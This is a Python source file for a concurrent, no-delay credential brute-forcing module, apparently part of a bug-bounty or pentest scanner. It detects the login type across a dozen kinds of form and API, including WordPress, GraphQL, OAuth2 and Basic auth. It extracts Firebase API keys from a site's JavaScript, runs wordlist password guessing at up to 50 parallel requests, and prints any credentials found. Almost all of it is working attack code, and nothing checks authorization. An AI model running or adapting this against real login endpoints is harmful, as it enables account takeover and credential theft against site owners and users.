import asyncio
import sys
from typing import List, Dict, Optional, Tuple, Set
from core.base_module import BaseModule, Finding
from pathlib import Path
import json
import urllib.request
import urllib.error


class CredentialTester(BaseModule):
    """Test for brute force vulnerabilities - CONCURRENT NO-DELAY VERSION"""

    FORM_TYPE_REGISTRY = {
        'html_form':      {'description': 'Classic HTML form with POST',                     'content_type': 'application/x-www-form-urlencoded', 'method': 'POST'},
        'json_api':       {'description': 'REST endpoint that accepts JSON body',             'content_type': 'application/json',                  'method': 'POST'},
        'graphql':        {'description': 'GraphQL mutation for login',                       'content_type': 'application/json',                  'method': 'POST'},
        'oauth2':         {'description': 'OAuth2 password-grant or token endpoint',          'content_type': 'application/x-www-form-urlencoded', 'method': 'POST'},
        'basic_auth':     {'description': 'HTTP Basic Authentication (Authorization header)', 'content_type': None,                                'method': 'GET'},
        'xml_soap':       {'description': 'SOAP/XML web-service login',                       'content_type': 'text/xml',                          'method': 'POST'},
        'multipart_form': {'description': 'HTML multipart/form-data (file-upload forms)',     'content_type': 'multipart/form-data',               'method': 'POST'},
        'jwt_login':      {'description': 'Endpoint that issues a JWT on login',              'content_type': 'application/json',                  'method': 'POST'},
        'ajax_form':      {'description': 'AJAX-driven login (XMLHttpRequest / fetch)',       'content_type': 'application/json',                  'method': 'POST'},
        'wordpress':      {'description': 'WordPress wp-login.php form',                      'content_type': 'application/x-www-form-urlencoded', 'method': 'POST'},
        'digest_auth':    {'description': 'HTTP Digest Authentication',                       'content_type': None,                                'method': 'GET'},
        'firebase':       {'description': 'Firebase Authentication',                            'content_type': 'application/json',                  'method': 'POST'},
    }

    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.max_attempts    = config.get('max_attempts', 1000)
        self.delay           = 0
        self.wordlist_path   = config.get('wordlist_path', 'wordlists')
        self.concurrency     = config.get('concurrency', 50)
        self.custom_userlist  = config.get('userlist', None)
        self.custom_passlist  = config.get('passlist', None)
        self._max_usernames   = config.get('max_usernames', 200)
        self._max_passwords   = config.get('max_passwords', 2000)

    def _print_progress(self, current: int, total: int, prefix: str = 'Progress', width: int = 40):
        if total == 0:
            return
        pct   = current / total
        filled = int(width * pct)
        bar   = '█' * filled + '░' * (width - filled)
        line  = f'\r\033[96m{prefix}:\033[0m [{bar}] \033[93m{pct*100:5.1f}%\033[0m  {current}/{total}'
        sys.stdout.write(line)
        sys.stdout.flush()
        if current >= total:
            sys.stdout.write('\n')
            sys.stdout.flush()

    async def run(self, target: str, **kwargs) -> List[Finding]:
        if not kwargs.get('enable_brute_force', False):
            return self.findings

        if kwargs.get('userlist'):      self.custom_userlist = kwargs['userlist']
        if kwargs.get('passlist'):      self.custom_passlist = kwargs['passlist']
        if kwargs.get('max_usernames'): self._max_usernames  = kwargs['max_usernames']
        if kwargs.get('max_passwords'): self._max_passwords  = kwargs['max_passwords']

        target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"

        print(f"\033[96m[*] Probing {target_url} to detect authentication type...\033[0m")
        
        # Probe the endpoint to detect form type
        endpoint = await self._probe_single_endpoint(target_url)
        
        if endpoint.get('form_type') == 'firebase_key_missing':
            return self.findings
            
        print(f"\033[92m[+] Detected form type: {endpoint.get('form_type', 'unknown')}\033[0m")
        print(f"\033[92m[+] Target URL: {endpoint['url']}\033[0m")

        ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt"
        plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt"
        print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
        print(f"\033[96m[*] Passlist : {plist_label}\033[0m\n")

        await self._test_brute_force(endpoint)
        return self.findings

    async def _probe_single_endpoint(self, url: str) -> Dict:
        import re
        from urllib.parse import urlparse, urljoin

        parsed = urlparse(url)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        default_fields = {
            'username_fields': ['email', 'username', 'user'],
            'password_field':  'password',
            'username_field':  'email',
            'email_field':     'email',
            'inputs': [], 'action': '', 'method': 'POST',
        }

        # Check if Firebase URL passed directly
        if 'identitytoolkit.googleapis.com' in url:
            print(f"\033[92m[+] Firebase Identity Toolkit URL detected\033[0m")
            return {
                'url': url, 'type': 'firebase', 'form_type': 'firebase',
                'fields': default_fields, 'is_api': True,
            }

        # Fetch the page
        text    = ""
        headers = {}
        try:
            resp = await self._make_request(url)
            if resp:
                text    = await resp.text()
                headers = resp.headers
        except Exception as e:
            self.logger.warning(f"Probe failed: {e}")

        # Firebase SPA detection
        firebase_hints = ['firebase', 'identitytoolkit', 'firebaseapp', 'firebaseConfig', 'apiKey']
        is_firebase    = ('web.app' in url or 'firebaseapp.com' in url or
                          any(h in text for h in firebase_hints))

        if is_firebase:
            key_m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{20,})', text)
            if not key_m:
                js_srcs = re.findall(r'src=["\'](https?://[^"\']+\.js[^"\']*|/[^"\']+\.js[^"\']*)["\']', text)
                print(f"\033[96m[*] Scanning {len(js_srcs)} JS bundle(s) for Firebase config...\033[0m")
                for src in js_srcs[:8]:
                    js_url = src if src.startswith('http') else base + src
                    try:
                        jr = await self._make_request(js_url)
                        if jr:
                            jt   = await jr.text()
                            key_m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{20,})', jt)
                            if key_m:
                                print(f"\033[92m[+] Found Firebase API key in {src.split('/')[-1]}\033[0m")
                                break
                    except Exception:
                        pass

            if key_m:
                fb_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={key_m.group(1)}"
                print(f"\033[92m[+] Firebase endpoint ready\033[0m")
                return {
                    'url': fb_url, 'type': 'firebase', 'form_type': 'firebase',
                    'fields': default_fields, 'is_api': True,
                }
            else:
                print(f"\033[91m[!] Firebase detected but API key not found.\033[0m")
                return {
                    'url': url, 'type': 'firebase_key_missing',
                    'form_type': 'firebase_key_missing',
                    'fields': default_fields, 'is_api': False,
                }

        # Extract HTML form fields
        fields = self._extract_form_fields(text) if text else default_fields

        # Resolve form action URL
        post_url = url
        if fields.get('action'):
            action = fields['action']
            if action.startswith('http'):
                post_url = action
            elif action.startswith('/'):
                post_url = base + action
            else:
                post_url = urljoin(url, action)

        # Detect form type
        ft = self._detect_form_type(url, text, headers)

        return {
            'url': post_url, 'type': 'direct', 'form_type': ft,
            'fields': fields, 'is_api': ft in ('json_api','graphql','oauth2','jwt_login','ajax_form','firebase'),
        }

    def _detect_form_type(self, url: str, html: str, headers) -> str:
        import re
        url_lower  = url.lower()
        html_lower = html.lower() if html else ''
        ct         = headers.get('Content-Type', '').lower() if headers else ''
        www_auth   = headers.get('WWW-Authenticate', '').lower() if headers else ''

        if 'digest' in www_auth:                                                  return 'digest_auth'
        if 'basic'  in www_auth:                                                  return 'basic_auth'
        if any(h in url_lower for h in ['/soap','/ws/','/wsdl','/service','/services']) \
           or any(h in html_lower for h in ['<soap:','wsdl','xmlns:soap','soapenv:']) \
           or 'xml' in ct:                                                        return 'xml_soap'
        if 'wp-login' in url_lower or ('wordpress' in html_lower and 'log in' in html_lower): return 'wordpress'
        if any(h in url_lower for h in ['/graphql','/gql','/graph']) \
           or any(h in html_lower for h in ['__schema','mutation','query{','query {','graphql']): return 'graphql'
        if any(h in url_lower for h in ['/oauth','/token','/connect/token','/identity/connect']) \
           or any(h in html_lower for h in ['grant_type','client_id','client_secret','access_token','oauth']): return 'oauth2'
        if any(h in url_lower for h in ['/jwt','/api/token','/api/auth','/api/login']) \
           or any(h in html_lower for h in ['access_token','refresh_token','jwt','bearer']):  return 'jwt_login'
        if 'multipart' in html_lower or re.search(r'enctype=["\']multipart', html_lower):    return 'multipart_form'
        if any(h in html_lower for h in ['xmlhttprequest','fetch(','axios','$.ajax','$.post','x-requested-with','json.stringify']): return 'ajax_form'
        if 'application/json' in ct or html.strip().startswith(('{','[')) \
           or any(h in url_lower for h in ['/api/','/rest/']):                    return 'json_api'
        return 'html_form'

    def _build_payload(self, form_type, username, password, username_fields, password_field):
        result = {'data': {}, 'headers': {}, 'method': 'POST', 'use_json': False,
                  'use_basic_auth': False, 'basic_auth_tuple': None}

        if form_type == 'html_form':
            payload = {password_field: password}
            for f in username_fields: payload[f] = username
            result['data'] = payload
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        elif form_type == 'json_api':
            payload = {password_field: password}
            for f in username_fields: payload[f] = username
            result['data'] = payload; result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        elif form_type == 'graphql':
            ufield = username_fields[0] if username_fields else 'email'
            mutation = (f'mutation {{ login({ufield}: "{username}", {password_field}: "{password}") '
                        f'{{ token user {{ id email }} }} }}')
            result['data'] = {'query': mutation}; result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        elif form_type == 'oauth2':
            result['data'] = {'grant_type':'password','username':username,'password':password,'scope':'openid profile email'}
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        elif form_type in ('basic_auth', 'digest_auth'):
            result['use_basic_auth'] = True; result['basic_auth_tuple'] = (username, password)
            result['method'] = 'GET'

        elif form_type == 'xml_soap':
            result['data'] = (
                '<?xml version="1.0" encoding="utf-8"?>'
                '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                '<soap:Body><Login xmlns="http://tempuri.org/">'
                f'<username>{username}</username><password>{password}</password>'
                '</Login></soap:Body></soap:Envelope>')
            result['headers']['Content-Type'] = 'text/xml; charset=utf-8'
            result['headers']['SOAPAction']   = '"Login"'

        elif form_type == 'multipart_form':
            payload = {password_field: password}
            for f in username_fields: payload[f] = username
            result['data'] = payload
            result['headers']['Content-Type'] = 'multipart/form-data'

        elif form_type in ('jwt_login', 'ajax_form'):
            payload = {password_field: password}
            for f in username_fields: payload[f] = username
            result['data'] = payload; result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'
            if form_type == 'ajax_form':
                result['headers']['X-Requested-With'] = 'XMLHttpRequest'

        elif form_type == 'wordpress':
            result['data'] = {'log': username, 'pwd': password, 'wp-submit': 'Log In',
                              'redirect_to': '/wp-admin/', 'testcookie': '1'}
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
            result['headers']['Cookie']       = 'wordpress_test_cookie=WP+Cookie+check'

        elif form_type == 'firebase':
            result['data'] = {'email': username, 'password': password, 'returnSecureToken': True}
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        else:
            payload = {password_field: password}
            for f in username_fields: payload[f] = username
            result['data'] = payload
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        return result

    def _extract_form_fields(self, html: str) -> Dict:
        import re
        fields = {'inputs': [], 'username_fields': [], 'password_field': None, 'action': '', 'method': 'POST'}
        if not html:
            return fields

        inputs    = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', html, re.IGNORECASE)
        js_inputs = re.findall(r'name["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
        for pattern in [r'["\'](email|username|user|login|name)["\']',
                        r'["\'](password|passwd|pwd|pass)["\']',
                        r'["\'](token|auth|session)["\']']:
            inputs.extend(re.findall(pattern, html, re.IGNORECASE))
        fields['inputs'] = list(set(inputs + js_inputs))

        action_m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if action_m: fields['action'] = action_m.group(1)
        method_m = re.search(r'<form[^>]+method=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if method_m: fields['method'] = method_m.group(1).upper()

        u_patterns = ['email','mail','e-mail','username','user','uname','login','name',
                      'account','userid','user_id','auth_user','identity','identifier','phone','mobile','cell']
        p_patterns = ['password','passwd','pwd','pass','user_password','auth_pass','secret','key','credential']

        for inp in fields['inputs']:
            for pat in u_patterns:
                if pat in inp.lower() and inp not in fields['username_fields']:
                    fields['username_fields'].append(inp); break

        for inp in fields['inputs']:
            for pat in p_patterns:
                if pat in inp.lower():
                    fields['password_field'] = inp; break
            if fields['password_field']: break

        if not fields['username_fields']:
            hl = html.lower()
            if 'email' in hl or 'e-mail' in hl: fields['username_fields'] = ['email','username','user']
            elif 'username' in hl:               fields['username_fields'] = ['username','email','user']
            else:                                fields['username_fields'] = ['email','username','user','login','name']
        if not fields['password_field']:         fields['password_field']  = 'password'

        fields['username_field'] = fields['username_fields'][0]
        fields['email_field']    = fields['username_fields'][0]
        return fields

    def _load_wordlists(self) -> Tuple[List[str], List[str]]:
        usernames: List[str] = []
        passwords: List[str] = []

        MAX_U = getattr(self, '_max_usernames', 200)
        MAX_P = getattr(self, '_max_passwords', 2000)

        def _load_capped(path, label, cap):
            lines = []
            with open(path, 'r', errors='ignore') as fh:
                for line in fh:
                    s = line.strip()
                    if s:
                        lines.append(s)
                    if len(lines) >= cap:
                        break
            flag = f' \033[91m(capped)\033[0m' if len(lines) == cap else ''
            print(f"\033[92m[+] {label}: {path} ({len(lines)} entries{flag})\033[0m")
            return lines

        import os
        cwd = Path(os.getcwd())

        def _resolve(raw_path: str) -> Optional[Path]:
            candidates = [
                Path(raw_path),
                cwd / raw_path,
                Path(raw_path).expanduser(),
            ]
            for c in candidates:
                try:
                    if c.exists():
                        return c.resolve()
                except Exception:
                    pass
            return None

        if self.custom_userlist:
            upath = _resolve(self.custom_userlist)
            if upath:
                usernames = _load_capped(upath, 'Custom userlist', MAX_U)
            else:
                print(f"\033[91m[!] Userlist not found: '{self.custom_userlist}'\033[0m")

        if not usernames:
            upath = _resolve(str(Path(self.wordlist_path) / 'usernames.txt'))
            if upath:
                usernames = _load_capped(upath, 'Userlist (default)', MAX_U)
            else:
                usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']
                print(f"\033[93m[!] No userlist found — using {len(usernames)} built-in defaults\033[0m")

        if self.custom_passlist:
            ppath = _resolve(self.custom_passlist)
            if ppath:
                passwords = _load_capped(ppath, 'Custom passlist', MAX_P)
            else:
                print(f"\033[91m[!] Passlist not found: '{self.custom_passlist}'\033[0m")

        if not passwords:
            ppath = _resolve(str(Path(self.wordlist_path) / 'passwords.txt'))
            if ppath:
                passwords = _load_capped(ppath, 'Passlist (default)', MAX_P)
            else:
                passwords = ['admin', 'password', '123456', 'login', 'admin123']
                print(f"\033[93m[!] No passlist found — using {len(passwords)} built-in defaults\033[0m")

        print()
        return usernames, passwords

    async def _test_brute_force(self, endpoint: Dict):
        import itertools

        url       = endpoint['url']
        form_type = endpoint.get('form_type', 'html_form')
        fields    = endpoint.get('fields', {})
        
        username_fields = fields.get('username_fields', ['email', 'username', 'user'])
        password_field  = fields.get('password_field', 'password')

        base_usernames, passwords = self._load_wordlists()
        all_usernames  = list(dict.fromkeys(base_usernames))
        total_attempts = len(all_usernames) * len(passwords)

        semaphore    = asyncio.Semaphore(self.concurrency)
        found_event  = asyncio.Event()
        rate_limited = [False]
        counter      = [0]

        print(f"\033[96m[*] Form Type : {form_type}\033[0m")
        print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
        print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
        print(f"\033[96m[*] Total     : {total_attempts}\033[0m\n")

        async def attempt(username: str, password: str):
            if found_event.is_set():
                return
            async with semaphore:
                if found_event.is_set():
                    return
                try:
                    loop = asyncio.get_event_loop()
                    
                    # Build the appropriate payload for this form type
                    payload_config = self._build_payload(
                        form_type, username, password, username_fields, password_field
                    )

                    def do_request():
                        try:
                            if payload_config.get('use_basic_auth'):
                                # Basic/Digest Auth
                                import base64
                                auth_str = base64.b64encode(
                                    f"{username}:{password}".encode()
                                ).decode()
                                req = urllib.request.Request(
                                    url,
                                    headers={
                                        'Authorization': f'Basic {auth_str}',
                                        'User-Agent': 'Mozilla/5.0'
                                    },
                                    method=payload_config['method']
                                )
                                with urllib.request.urlopen(req, timeout=15) as r:
                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers)
                            
                            else:
                                # Form/JSON/XML POST
                                data = payload_config['data']
                                if payload_config.get('use_json'):
                                    body = json.dumps(data).encode('utf-8')
                                else:
                                    body = urllib.parse.urlencode(data).encode('utf-8')
                                
                                req = urllib.request.Request(
                                    url,
                                    data=body,
                                    headers={**payload_config['headers'], 'User-Agent': 'Mozilla/5.0'},
                                    method=payload_config['method']
                                )
                                with urllib.request.urlopen(req, timeout=15) as r:
                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers)
                                    
                        except urllib.error.HTTPError as e:
                            return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers)
                        except Exception as ex:
                            return 0, str(ex), {}

                    status, text, resp_headers = await loop.run_in_executor(None, do_request)
                    tl = text.lower()

                    counter[0] += 1
                    self._print_progress(counter[0], total_attempts,
                                         prefix=f'  \033[96m{username[:22]:<22}\033[0m')

                    # Show first response for debugging
                    if counter[0] == 1:
                        sys.stdout.write('\n')
                        print(f"\033[90m[debug] HTTP {status} | {text[:300]}\033[0m\n")

                    if status == 429:
                        rate_limited[0] = True
                        found_event.set()
                        return

                    # Check for success based on form type
                    is_success = False
                    
                    if form_type == 'firebase':
                        # Firebase returns idToken on success
                        if 'idtoken' in tl or 'id_token' in tl:
                            is_success = True
                    elif form_type in ('json_api', 'jwt_login', 'ajax_form', 'oauth2'):
                        # Check for tokens in JSON response
                        if any(k in tl for k in ['token', 'access_token', 'auth_token', 'session']):
                            if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong']):
                                is_success = True
                    elif form_type == 'basic_auth' or form_type == 'digest_auth':
                        # HTTP 200/OK means success for basic auth
                        if status == 200:
                            is_success = True
                    elif form_type == 'wordpress':
                        # WordPress redirects to wp-admin on success
                        if status in [301, 302] and 'wp-admin' in resp_headers.get('Location', '').lower():
                            is_success = True
                        if 'dashboard' in tl or 'wp-admin' in tl:
                            is_success = True
                    else:
                        # Generic HTML form detection
                        if status in [301, 302, 303]:
                            location = resp_headers.get('Location', '').lower()
                            if any(p in location for p in ['/dashboard','/admin','/home','/profile','/welcome','/panel','/main']):
                                is_success = True
                            if any(p in location for p in ['/login','/signin','/error','/fail','/denied']):
                                is_success = False
                        elif status == 200:
                            # Check response content
                            error_indicators = ['invalid','incorrect','failed','error','wrong','denied','unauthorized','try again']
                            success_indicators = ['welcome','dashboard','logout','profile','admin panel','successful','session','token']
                            
                            has_error = any(err in tl for err in error_indicators)
                            has_success = sum(1 for s in success_indicators if s in tl) >= 2
                            
                            # Check cookies
                            cookies = str(resp_headers.get('Set-Cookie', '')).lower()
                            has_auth_cookie = any(c in cookies for c in ['session','token','auth','jwt'])
                            
                            if has_auth_cookie or (has_success and not has_error):
                                is_success = True

                    if is_success:
                        sys.stdout.write('\n')
                        self._report_success(username, password, url, counter[0],
                                             username_fields, password_field)
                        found_event.set()

                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    counter[0] += 1

        tasks = [asyncio.create_task(attempt(u, p))
                 for u, p in itertools.product(all_usernames, passwords)]
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except (KeyboardInterrupt, asyncio.CancelledError):
            for t in tasks: t.cancel()
            sys.stdout.write('\n')
            print(f"\033[93m[!] Interrupted after {counter[0]} attempts\033[0m")
            return

        sys.stdout.write('\n')
        if rate_limited[0]:
            self._add_rate_limit_finding(url, counter[0])
        elif not found_event.is_set():
            print(f"\033[93m[-] No credentials found after {counter[0]} attempts\033[0m")

    def _report_success(self, username, password, url, attempts, username_fields, password_field):
        sep = "=" * 60
        print(f"\n\033[91m{sep}\033[0m")
        print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
        print(f"\033[92m      Username : {username}\033[0m")
        print(f"\033[92m      Password : {password}\033[0m")
        print(f"\033[92m      URL      : {url}\033[0m")
        print(f"\033[92m      Attempts : {attempts}\033[0m")
        print(f"\033[91m{sep}\033[0m\n")
        self.add_finding(Finding(
            module='brute_force',
            title=f'[CREDENTIALS FOUND] {username}:{password} @ {url}',
            severity='Critical',
            description=f'Successfully brute-forced login at {url}\nUsername: {username}\nPassword: {password}\nAttempts: {attempts}',
            evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
            poc=f"curl -X POST '{url}' -d '{username_fields[0]}={username}&{password_field}={password}'",
            remediation='Implement strong password policy, rate limiting, and account lockout',
            cvss_score=9.8, bounty_score=5000, target=url))

    def _add_rate_limit_finding(self, url, attempts):
        self.add_finding(Finding(
            module='brute_force', title='Rate Limiting Detected During Brute Force',
            severity='Info',
            description=f'Rate limiting triggered after {attempts} attempts',
            evidence={'attempts': attempts, 'url': url},
            poc=f"Send {attempts} login requests to {url}",
            remediation='Rate limiting is working correctly',
            cvss_score=0.0, bounty_score=0, target=url))
